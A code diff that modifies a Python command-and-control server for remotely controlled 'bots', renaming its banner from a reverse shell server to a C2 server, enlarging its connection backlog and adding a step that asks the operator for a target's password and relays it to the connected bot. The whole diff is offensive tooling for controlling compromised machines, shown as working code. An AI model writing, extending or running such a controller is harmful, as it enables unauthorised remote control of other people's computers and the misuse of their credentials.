@@ -5,6 +5,7 @@ from termcolor import colored
 import os
 import sys
 import random
+import getpass
 
 LINE_CLEAR = "\x1b[2K"
 default_port = 38433
@@ -22,10 +23,10 @@ class C2Server:
         self.server_socket = socket(AF_INET, SOCK_STREAM)
         self.server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
         self.server_socket.bind(("", self.server_port))
-        self.server_socket.listen(3)
+        self.server_socket.listen(5)
         print(
             colored(
-                f"[+] Reverse shell server waiting for connections on port {self.server_port}",
+                f"[+] C2C server waiting for connections on port {self.server_port}",
                 "yellow",
                 "on_grey",
                 ["bold"],
@@ -35,9 +36,7 @@ class C2Server:
 
     def handle_client(self, connection_socket, addr):
         print(
-            colored(
-                f"\nBot at {addr} reporting for duty", "cyan", "on_grey", ["bold"]
-            ),
+            colored(f"\nBot at {addr} reporting for duty", "cyan", "on_grey", ["bold"]),
             end="\n",
         )
 
@@ -82,6 +81,14 @@ class C2Server:
 
             self.active_bot.send(command.encode())
             message = self.active_bot.recv(4048).decode()
+            parsed_message = message
+
+            if "needpass" in message:
+                password = getpass.getpass("Enter the target's password: ")
+                self.active_bot.send(password.encode())
+                message = self.active_bot.recv(4048).decode()
+                continue
+
             print(message)
 
         self.shutdown_server()
